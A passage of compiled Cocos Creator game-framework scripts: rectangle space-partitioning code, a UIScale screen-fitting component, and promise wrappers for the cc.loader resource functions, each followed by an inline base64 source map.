G4gICAgc3RhdGljIHJhbmRvbVNwYWNlKHBhcnRpdGlvbnM6QXJyYXk8Y2MuUmVjdD4sIHdpZHRoOm51bWJlciwgaGVpZ2h0Om51bWJlcik6Y2MuUmVjdHtcclxuICAgICAgICBsZXQgYXJyID0gcGFydGl0aW9ucy5maWx0ZXIodmFsdWUgPT4gdmFsdWUud2lkdGggPiB3aWR0aCAmJiB2YWx1ZS5oZWlnaHQgPiBoZWlnaHQpO1xyXG4gICAgICAgIGlmIChhcnIubGVuZ3RoID09PSAwKXJldHVybiBudWxsO1xyXG4gICAgICAgIGxldCBpbmRleCA9IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIGFyci5sZW5ndGgpJWFyci5sZW5ndGg7XHJcbiAgICAgICAgbGV0IHBhcnRpdGlvbiA9IGFycltpbmRleF07XHJcbiAgICAgICAgbGV0IHggPSBwYXJ0aXRpb24ueE1pbiArIE1hdGgucmFuZG9tKCkqKHBhcnRpdGlvbi53aWR0aCAtIHdpZHRoKTtcclxuICAgICAgICBsZXQgeSA9IHBhcnRpdGlvbi55TWluICsgTWF0aC5yYW5kb20oKSoocGFydGl0aW9uLmhlaWdodCAtIGhlaWdodCk7XHJcblxyXG4gICAgICAgIGxldCByZXN1bHQgPSBjYy5yZWN0KHgsIHksIHdpZHRoLCBoZWlnaHQpO1xyXG5cclxuICAgICAgICAvKiog6Lef5a6D55u45Lqk55qE6KaB6YeN5paw5YiS5YiGICovXHJcbiAgICAgICAgdGhpcy5wYXJ0aXRpb25SZWN0KHBhcnRpdGlvbnMsIHJlc3VsdCk7XHJcblxyXG4gICAgICAgIHJldHVybiByZXN1bHQ7XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIHJhbmRvbVNwYWNlcyhwYXJ0aXRpb25zOkFycmF5PGNjLlJlY3Q+LCB3aWR0aDpudW1iZXIsIGhlaWdodDpudW1iZXIsIGNvdW50Om51bWJlcik6QXJyYXk8Y2MuUmVjdD57XHJcbiAgICAgICAgbGV0IHJlc3VsdCA9IFtdO1xyXG4gICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgY291bnQ7IGkrKyl7XHJcbiAgICAgICAgICAgIGxldCByZWN0ID0gdGhpcy5yYW5kb21TcGFjZShwYXJ0aXRpb25zLCB3aWR0aCwgaGVpZ2h0KTtcclxuICAgICAgICAgICAgaWYgKHJlY3Qpe1xyXG4gICAgICAgICAgICAgICAgcmVzdWx0LnB1c2gocmVjdCk7XHJcbiAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuICAgICAgICByZXR1cm4gcmVzdWx0O1xyXG4gICAgfVxyXG5cclxuICAgIHN0YXRpYyBwYXJ0aXRpb25SZWN0KG91dDpBcnJheTxjYy5SZWN0PiwgcmVjdDpjYy5SZWN0LCBtaW5XaWR0aDpudW1iZXIgPSAwLCBtaW5IZWlnaHQ6bnVtYmVyID0gMCl7XHJcbiAgICAgICAgbGV0IGxpc3QgPSBvdXQuc3BsaWNlKDApO1xyXG4gICAgICAgIGxpc3QuZm9yRWFjaCh2YWx1ZSA9PiB7XHJcbiAgICAgICAgICAgIGxldCBpbnRlcnNlY3Rpb24gPSBuZXcgY2MuUmVjdCgpO1xyXG4gICAgICAgICAgICB2YWx1ZS5pbnRlcnNlY3Rpb24oaW50ZXJzZWN0aW9uLCByZWN0KTtcclxuICAgICAgICAgICAgaWYgKGludGVyc2VjdGlvbi53aWR0aCA+IDAgJiYgaW50ZXJzZWN0aW9uLmhlaWdodCA+IDApe1xyXG4gICAgICAgICAgICAgICAgU3BhY2VQYXJ0aXRpb24ucGFydGl0aW9uUmVjdHMob3V0LCB2YWx1ZSwgW3JlY3RdLCBtaW5XaWR0aCwgbWluSGVpZ2h0KTtcclxuICAgICAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICAgICAgb3V0LnB1c2godmFsdWUpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOagueaNruebuOS6pOaLhuWIhuefqeW9oiAqL1xyXG4gICAgcHJpdmF0ZSBzdGF0aWMgcGFydGl0aW9uUmVjdHMob3V0OkFycmF5PGNjLlJlY3Q+LCByZWN0OmNjLlJlY3QsIGludGVyc2VjdHM6QXJyYXk8Y2MuUmVjdD4sIG1pbldpZHRoOm51bWJlciwgbWluSGVpZ2h0Om51bWJlcil7XHJcbiAgICAgICAgaWYgKHJlY3Qud2lkdGggPCBtaW5XaWR0aCB8fCByZWN0LmhlaWdodCA8IG1pbkhlaWdodCl7XHJcbiAgICAgICAgICAgIHJldHVybjtcclxuICAgICAgICB9XHJcbiAgICAgICAgaWYgKGludGVyc2VjdHMubGVuZ3RoID09IDApe1xyXG4gICAgICAgICAgICAvL+W5suWHgOeahOepuumXtFxyXG4gICAgICAgICAgICBvdXQucHVzaChyZWN0KTtcclxuICAgICAgICAgICAgcmV0dXJuO1xyXG4gICAgICAgIH1cclxuICAgICAgICBsZXQgY3V0UmVjdCA9IGludGVyc2VjdHMucG9wKCk7XHJcbiAgICAgICAgLy/lt6ZcclxuICAgICAgICBpZiAocmVjdC54TWluIDwgY3V0UmVjdC54TWluKXtcclxuICAgICAgICAgICAgbGV0IGxlZnRSZWN0ID0gY2MucmVjdChyZWN0LnhNaW4sIHJlY3QueU1pbiwgY3V0UmVjdC54TWluIC0gcmVjdC54TWluLCByZWN0LmhlaWdodCk7XHJcbiAgICAgICAgICAgIHRoaXMucGFydGl0aW9uUmVjdHMob3V0LCBsZWZ0UmVjdCwgaW50ZXJzZWN0cy5maWx0ZXIodmFsdWUgPT4ge1xyXG4gICAgICAgICAgICAgICAgbGV0IGludGVyc2VjdGlvbiA9IG5ldyBjYy5SZWN0KCk7XHJcbiAgICAgICAgICAgICAgICB2YWx1ZS5pbnRlcnNlY3Rpb24oaW50ZXJzZWN0aW9uLCBsZWZ0UmVjdCk7XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gaW50ZXJzZWN0aW9uLndpZHRoID4gMCAmJiBpbnRlcnNlY3Rpb24uaGVpZ2h0ID4gMDtcclxuICAgICAgICAgICAgfSksIG1pbldpZHRoLCBtaW5IZWlnaHQpXHJcbiAgICAgICAgfVxyXG4gICAgICAgIC8v5Y+zXHJcbiAgICAgICAgaWYgKHJlY3QueE1heCA+IGN1dFJlY3QueE1heCl7XHJcbiAgICAgICAgICAgIGxldCByaWdodFJlY3QgPSBjYy5yZWN0KGN1dFJlY3QueE1heCwgcmVjdC55TWluLCByZWN0LnhNYXggLSBjdXRSZWN0LnhNYXgsIHJlY3QuaGVpZ2h0KTtcclxuICAgICAgICAgICAgdGhpcy5wYXJ0aXRpb25SZWN0cyhvdXQsIHJpZ2h0UmVjdCwgaW50ZXJzZWN0cy5maWx0ZXIodmFsdWUgPT4ge1xyXG4gICAgICAgICAgICAgICAgbGV0IGludGVyc2VjdGlvbiA9IG5ldyBjYy5SZWN0KCk7XHJcbiAgICAgICAgICAgICAgICB2YWx1ZS5pbnRlcnNlY3Rpb24oaW50ZXJzZWN0aW9uLCByaWdodFJlY3QpO1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuIGludGVyc2VjdGlvbi53aWR0aCA+IDAgJiYgaW50ZXJzZWN0aW9uLmhlaWdodCA+IDA7XHJcbiAgICAgICAgICAgIH0pLCBtaW5XaWR0aCwgbWluSGVpZ2h0KVxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgLy/kuIpcclxuICAgICAgICBpZiAocmVjdC55TWF4ID4gY3V0UmVjdC55TWF4KXtcclxuICAgICAgICAgICAgbGV0IHVwUmVjdCA9IGNjLnJlY3QocmVjdC54TWluLCBjdXRSZWN0LnlNYXgsIHJlY3Qud2lkdGgsIHJlY3QueU1heCAtIGN1dFJlY3QueU1heCk7XHJcbiAgICAgICAgICAgIHRoaXMucGFydGl0aW9uUmVjdHMob3V0LCB1cFJlY3QsIGludGVyc2VjdHMuZmlsdGVyKHZhbHVlID0+IHtcclxuICAgICAgICAgICAgICAgIGxldCBpbnRlcnNlY3Rpb24gPSBuZXcgY2MuUmVjdCgpO1xyXG4gICAgICAgICAgICAgICAgdmFsdWUuaW50ZXJzZWN0aW9uKGludGVyc2VjdGlvbiwgdXBSZWN0KTtcclxuICAgICAgICAgICAgICAgIHJldHVybiBpbnRlcnNlY3Rpb24ud2lkdGggPiAwICYmIGludGVyc2VjdGlvbi5oZWlnaHQgPiAwO1xyXG4gICAgICAgICAgICB9KSwgbWluV2lkdGgsIG1pbkhlaWdodClcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIC8v5LiLXHJcbiAgICAgICAgaWYgKHJlY3QueU1pbiA8IGN1dFJlY3QueU1pbil7XHJcbiAgICAgICAgICAgIGxldCBkb3duUmVjdCA9IGNjLnJlY3QocmVjdC54TWluLCByZWN0LnlNaW4sIHJlY3Qud2lkdGgsIGN1dFJlY3QueU1pbiAtIHJlY3QueU1pbik7XHJcbiAgICAgICAgICAgIHRoaXMucGFydGl0aW9uUmVjdHMob3V0LCBkb3duUmVjdCwgaW50ZXJzZWN0cy5maWx0ZXIodmFsdWUgPT4ge1xyXG4gICAgICAgICAgICAgICAgbGV0IGludGVyc2VjdGlvbiA9IG5ldyBjYy5SZWN0KCk7XHJcbiAgICAgICAgICAgICAgICB2YWx1ZS5pbnRlcnNlY3Rpb24oaW50ZXJzZWN0aW9uLCBkb3duUmVjdCk7XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gaW50ZXJzZWN0aW9uLndpZHRoID4gMCAmJiBpbnRlcnNlY3Rpb24uaGVpZ2h0ID4gMDtcclxuICAgICAgICAgICAgfSksIG1pbldpZHRoLCBtaW5IZWlnaHQpXHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/component/UIScale.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '422cbmXYSFCDaWW8A+EYdil', 'UIScale');
// framework/component/UIScale.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property, menu = _a.menu;
var UIScale = /** @class */ (function (_super) {
    __extends(UIScale, _super);
    function UIScale() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.fitScale = false;
        _this.fitPosition = true;
        return _this;
    }
    UIScale.prototype.start = function () {
        var heightScale = cc.view.getVisibleSize().height / cc.view.getDesignResolutionSize().height;
        var widthScale = cc.view.getVisibleSize().width / cc.view.getDesignResolutionSize().width;
        var addScale = Math.abs(heightScale - widthScale);
        if (this.fitScale) {
            this.node.setScale(this.node.scale + addScale);
        }
        if (this.fitPosition) {
            var worldPos = this.node.convertToWorldSpaceAR(cc.v2(0, 0));
            if (heightScale > widthScale) {
                var y = worldPos.y * (1 + addScale);
                this.node.y = this.node.convertToNodeSpaceAR(cc.v2(0, y)).y;
            }
            else {
                var x = worldPos.x * (1 + addScale);
                this.node.x = this.node.convertToNodeSpaceAR(cc.v2(x, 0)).x;
            }
        }
    };
    __decorate([
        property
    ], UIScale.prototype, "fitScale", void 0);
    __decorate([
        property
    ], UIScale.prototype, "fitPosition", void 0);
    UIScale = __decorate([
        ccclass,
        menu("自定义/UIScale")
    ], UIScale);
    return UIScale;
}(cc.Component));
exports.default = UIScale;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvY29tcG9uZW50L1VJU2NhbGUudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsb0JBQW9CO0FBQ3BCLGlGQUFpRjtBQUNqRix5RkFBeUY7QUFDekYsbUJBQW1CO0FBQ25CLDJGQUEyRjtBQUMzRixtR0FBbUc7QUFDbkcsOEJBQThCO0FBQzlCLDJGQUEyRjtBQUMzRixtR0FBbUc7O0FBRTdGLElBQUEsS0FBNEIsRUFBRSxDQUFDLFVBQVUsRUFBeEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFBLEVBQUUsSUFBSSxVQUFpQixDQUFDO0FBSWhEO0lBQXFDLDJCQUFZO0lBQWpEO1FBQUEscUVBNEJDO1FBekJHLGNBQVEsR0FBRyxLQUFLLENBQUM7UUFHakIsaUJBQVcsR0FBRyxJQUFJLENBQUM7O0lBc0J2QixDQUFDO0lBcEJHLHVCQUFLLEdBQUw7UUFDSSxJQUFJLFdBQVcsR0FBRyxFQUFFLENBQUMsSUFBSSxDQUFDLGNBQWMsRUFBRSxDQUFDLE1BQU0sR0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLHVCQUF1QixFQUFFLENBQUMsTUFBTSxDQUFDO1FBQzNGLElBQUksVUFBVSxHQUFHLEVBQUUsQ0FBQyxJQUFJLENBQUMsY0FBYyxFQUFFLENBQUMsS0FBSyxHQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUMsdUJBQXVCLEVBQUUsQ0FBQyxLQUFLLENBQUM7UUFFeEYsSUFBSSxRQUFRLEdBQUcsSUFBSSxDQUFDLEdBQUcsQ0FBQyxXQUFXLEdBQUcsVUFBVSxDQUFDLENBQUM7UUFDbEQsSUFBSSxJQUFJLENBQUMsUUFBUSxFQUFDO1lBQ2QsSUFBSSxDQUFDLElBQUksQ0FBQyxRQUFRLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxLQUFLLEdBQUcsUUFBUSxDQUFDLENBQUM7U0FDbEQ7UUFFRCxJQUFJLElBQUksQ0FBQyxXQUFXLEVBQUM7WUFDakIsSUFBSSxRQUFRLEdBQUcsSUFBSSxDQUFDLElBQUksQ0FBQyxxQkFBcUIsQ0FBQyxFQUFFLENBQUMsRUFBRSxDQUFDLENBQUMsRUFBRSxDQUFDLENBQUMsQ0FBQyxDQUFDO1lBQzVELElBQUksV0FBVyxHQUFHLFVBQVUsRUFBQztnQkFDekIsSUFBSSxDQUFDLEdBQUcsUUFBUSxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsR0FBQyxRQUFRLENBQUMsQ0FBQztnQkFDbEMsSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDLEdBQUcsSUFBSSxDQUFDLElBQUksQ0FBQyxvQkFBb0IsQ0FBQyxFQUFFLENBQUMsRUFBRSxDQUFDLENBQUMsRUFBRSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQzthQUMvRDtpQkFBSztnQkFDRixJQUFJLENBQUMsR0FBRyxRQUFRLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxHQUFHLFFBQVEsQ0FBQyxDQUFDO2dCQUNwQyxJQUFJLENBQUMsSUFBSSxDQUFDLENBQUMsR0FBRyxJQUFJLENBQUMsSUFBSSxDQUFDLG9CQUFvQixDQUFDLEVBQUUsQ0FBQyxFQUFFLENBQUMsQ0FBQyxFQUFFLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO2FBQy9EO1NBQ0o7SUFDTCxDQUFDO0lBeEJEO1FBREMsUUFBUTs2Q0FDUTtJQUdqQjtRQURDLFFBQVE7Z0RBQ1U7SUFORixPQUFPO1FBRjNCLE9BQU87UUFDUCxJQUFJLENBQUMsYUFBYSxDQUFDO09BQ0MsT0FBTyxDQTRCM0I7SUFBRCxjQUFDO0NBNUJELEFBNEJDLENBNUJvQyxFQUFFLENBQUMsU0FBUyxHQTRCaEQ7a0JBNUJvQixPQUFPIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiLy8gTGVhcm4gVHlwZVNjcmlwdDpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vIExlYXJuIEF0dHJpYnV0ZTpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gTGVhcm4gbGlmZS1jeWNsZSBjYWxsYmFja3M6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHksIG1lbnV9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbkBtZW51KFwi6Ieq5a6a5LmJL1VJU2NhbGVcIilcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgVUlTY2FsZSBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBmaXRTY2FsZSA9IGZhbHNlO1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZml0UG9zaXRpb24gPSB0cnVlO1xyXG5cclxuICAgIHN0YXJ0ICgpIHtcclxuICAgICAgICBsZXQgaGVpZ2h0U2NhbGUgPSBjYy52aWV3LmdldFZpc2libGVTaXplKCkuaGVpZ2h0L2NjLnZpZXcuZ2V0RGVzaWduUmVzb2x1dGlvblNpemUoKS5oZWlnaHQ7XHJcbiAgICAgICAgbGV0IHdpZHRoU2NhbGUgPSBjYy52aWV3LmdldFZpc2libGVTaXplKCkud2lkdGgvY2Mudmlldy5nZXREZXNpZ25SZXNvbHV0aW9uU2l6ZSgpLndpZHRoO1xyXG5cclxuICAgICAgICBsZXQgYWRkU2NhbGUgPSBNYXRoLmFicyhoZWlnaHRTY2FsZSAtIHdpZHRoU2NhbGUpO1xyXG4gICAgICAgIGlmICh0aGlzLmZpdFNjYWxlKXtcclxuICAgICAgICAgICAgdGhpcy5ub2RlLnNldFNjYWxlKHRoaXMubm9kZS5zY2FsZSArIGFkZFNjYWxlKTtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIGlmICh0aGlzLmZpdFBvc2l0aW9uKXtcclxuICAgICAgICAgICAgbGV0IHdvcmxkUG9zID0gdGhpcy5ub2RlLmNvbnZlcnRUb1dvcmxkU3BhY2VBUihjYy52MigwLCAwKSk7XHJcbiAgICAgICAgICAgIGlmIChoZWlnaHRTY2FsZSA+IHdpZHRoU2NhbGUpe1xyXG4gICAgICAgICAgICAgICAgbGV0IHkgPSB3b3JsZFBvcy55ICogKDErYWRkU2NhbGUpO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5ub2RlLnkgPSB0aGlzLm5vZGUuY29udmVydFRvTm9kZVNwYWNlQVIoY2MudjIoMCwgeSkpLnk7XHJcbiAgICAgICAgICAgIH0gZWxzZXtcclxuICAgICAgICAgICAgICAgIGxldCB4ID0gd29ybGRQb3MueCAqICgxICsgYWRkU2NhbGUpO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5ub2RlLnggPSB0aGlzLm5vZGUuY29udmVydFRvTm9kZVNwYWNlQVIoY2MudjIoeCwgMCkpLng7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/extend/ccloaderAwait.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'e303ct+NQ1IDLF7WAIkdu7m', 'ccloaderAwait');
// framework/extend/ccloaderAwait.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
function getRes(url, type) {
    return __awaiter(this, void 0, Promise, function () {
        var _this = this;
        return __generator(this, function (_a) {
            return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                    var res, res_1;
                    return __generator(this, function (_a) {
                        switch (_a.label) {
                            case 0:
                                res = cc.loader.getRes(url, type);
                                if (!(res == null)) return [3 /*break*/, 2];
                                return [4 /*yield*/, loadRes(url, type).catch(function (err) {
                                        reject(err);
                                    })];
                            case 1:
                                res_1 = _a.sent();
                                resolve(res_1);
                                return [3 /*break*/, 3];
                            case 2:
                                resolve(res);
                                _a.label = 3;
                            case 3: return [2 /*return*/];
                        }
                    });
                }); })];
        });
    });
}
function loadRes() {
    var args = [];
    for (var _i = 0; _i < arguments.length; _i++) {
        args[_i] = arguments[_i];
    }
    return __awaiter(this, void 0, Promise, function () {
        return __generator(this, function (_a) {
            return [2 /*return*/, new Promise(function (resolve, reject) {
                    var _a;
                    (_a = cc.loader).loadRes.apply(_a, __spreadArrays(args, [function (err, res) {
                            if (err == null) {
                                resolve(res);
                            }
                            else {
                                reject(err);
                            }
                        }]));
                })];
        });
    });
}
function loadResArray() {
    var args = [];
    for (var _i = 0; _i < arguments.length; _i++) {
        args[_i] = arguments[_i];
    }
    return __awaiter(this, void 0, Promise, function () {
        return __generator(this, function (_a) {
            return [2 /*return*/, new Promise(function (resolve, reject) {
                    var _a;
                    (_a = cc.loader).loadResArray.apply(_a, __spreadArrays(args, [function (err, res) {
                            if (err == null) {
                                resolve(res);
                            }
                            else {
                                reject(err);
                            }
                        }]));
                })];
        });
    });
}
function loadResDir() {
    var args = [];
    for (var _i = 0; _i < arguments.length; _i++) {
        args[_i] = arguments[_i];
    }
    return __awaiter(this, void 0, Promise, function () {
        return __generator(this, function (_a) {
            return [2 /*return*/, new Promise(function (resolve, reject) {
                    var _a;
                    (_a = cc.loader).loadResDir.apply(_a, __spreadArrays(args, [function (err, resource, urls) {
                            if (err == null) {
                                resolve([resource, urls]);
                            }
                            else {
                                reject(err);
                            }
                        }]));
                })];
        });
    });
}
function getFileNames(dir, type) {
    var urls = [];
    cc.loader._resources.getUuidArray(dir, type, urls);
    return urls;
}
cc.loader.getResAwait = getRes;
cc.loader.loadResAwait = loadRes;
cc.loader.loadResArrayAwait = loadResArray;
cc.loader.loadResDirAwait = loadResDir;
cc.loader.getFileNames = getFileNames;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZXh0ZW5kL2NjbG9hZGVyQXdhaXQudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsb0JBQW9CO0FBQ3BCLGlGQUFpRjtBQUNqRix5RkFBeUY7QUFDekYsbUJBQW1CO0FBQ25CLDJGQUEyRjtBQUMzRixtR0FBbUc7QUFDbkcsOEJBQThCO0FBQzlCLDJGQUEyRjtBQUMzRixtR0FBbUc7QUFFbkcsU0FBZSxNQUFNLENBQUMsR0FBVyxFQUFFLElBQWU7bUNBQUUsT0FBTzs7O1lBQ3ZELHNCQUFPLElBQUksT0FBTyxDQUFDLFVBQU8sT0FBTyxFQUFFLE1BQU07Ozs7O2dDQUNqQyxHQUFHLEdBQUcsRUFBRSxDQUFDLE1BQU0sQ0FBQyxNQUFNLENBQUMsR0FBRyxFQUFFLElBQUksQ0FBQyxDQUFDO3FDQUNuQyxDQUFBLEdBQUcsSUFBSSxJQUFJLENBQUEsRUFBWCx3QkFBVztnQ0FDQSxxQkFBTSxPQUFPLENBQUMsR0FBRyxFQUFFLElBQUksQ0FBQyxDQUFDLEtBQUssQ0FBQyxVQUFVLEdBQUc7d0NBQ2xELE1BQU0sQ0FBQyxHQUFHLENBQUMsQ0FBQztvQ0FDaEIsQ0FBQyxDQUFDLEVBQUE7O2dDQUZFLFFBQU0sU0FFUjtnQ0FDRixPQUFPLENBQUMsS0FBRyxDQUFDLENBQUM7OztnQ0FFYixPQUFPLENBQUMsR0FBRyxDQUFDLENBQUM7Ozs7O3FCQUVwQixDQUFDLEVBQUM7OztDQUNOO0FBRUQsU0FBZSxPQUFPO0lBQUMsY0FBTztTQUFQLFVBQU8sRUFBUCxxQkFBTyxFQUFQLElBQU87UUFBUCx5QkFBTzs7bUNBQUUsT0FBTzs7WUFDbkMsc0JBQU8sSUFBSSxPQUFPLENBQUMsVUFBQyxPQUFPLEVBQUUsTUFBTTs7b0JBQy9CLENBQUEsS0FBQSxFQUFFLENBQUMsTUFBTSxDQUFBLENBQUMsT0FBTywwQkFBSSxJQUFJLEdBQUUsVUFBVSxHQUFHLEVBQUUsR0FBRzs0QkFDekMsSUFBSSxHQUFHLElBQUksSUFBSSxFQUFDO2dDQUNaLE9BQU8sQ0FBQyxHQUFHLENBQUMsQ0FBQzs2QkFDaEI7aUNBQU07Z0NBQ0gsTUFBTSxDQUFDLEdBQUcsQ0FBQyxDQUFDOzZCQUNmO3dCQUNMLENBQUMsSUFBRTtnQkFDUCxDQUFDLENBQUMsRUFBQzs7O0NBQ047QUFFRCxTQUFlLFlBQVk7SUFBQyxjQUFPO1NBQVAsVUFBTyxFQUFQLHFCQUFPLEVBQVAsSUFBTztRQUFQLHlCQUFPOzttQ0FBRSxPQUFPOztZQUN4QyxzQkFBTyxJQUFJLE9BQU8sQ0FBQyxVQUFDLE9BQU8sRUFBRSxNQUFNOztvQkFDL0IsQ0FBQSxLQUFBLEVBQUUsQ0FBQyxNQUFNLENBQUEsQ0FBQyxZQUFZLDBCQUFJLElBQUksR0FBRSxVQUFVLEdBQUcsRUFBRSxHQUFHOzRCQUM5QyxJQUFJLEdBQUcsSUFBSSxJQUFJLEVBQUM7Z0NBQ1osT0FBTyxDQUFDLEdBQUcsQ0FBQyxDQUFDOzZCQUNoQjtpQ0FBTTtnQ0FDSCxNQUFNLENBQUMsR0FBRyxDQUFDLENBQUM7NkJBQ2Y7d0JBQ0wsQ0FBQyxJQUFFO2dCQUNQLENBQUMsQ0FBQyxFQUFDOzs7Q0FDTjtBQUVELFNBQWUsVUFBVTtJQUFDLGNBQU87U0FBUCxVQUFPLEVBQVAscUJBQU8sRUFBUCxJQUFPO1FBQVAseUJBQU87O21DQUFFLE9BQU87O1lBQ3RDLHNCQUFPLElBQUksT0FBTyxDQUFDLFVBQUMsT0FBTyxFQUFFLE1BQU07O29CQUMvQixDQUFBLEtBQUEsRUFBRSxDQUFDLE1BQU0sQ0FBQSxDQUFDLFVBQVUsMEJBQUksSUFBSSxHQUFFLFVBQVUsR0FBVSxFQUFFLFFBQWUsRUFBRSxJQUFjOzRCQUMvRSxJQUFJLEdBQUcsSUFBSSxJQUFJLEVBQUM7Z0NBQ1osT0FBTyxDQUFDLENBQUMsUUFBUSxFQUFFLElBQUksQ0FBQyxDQUFDLENBQUM7N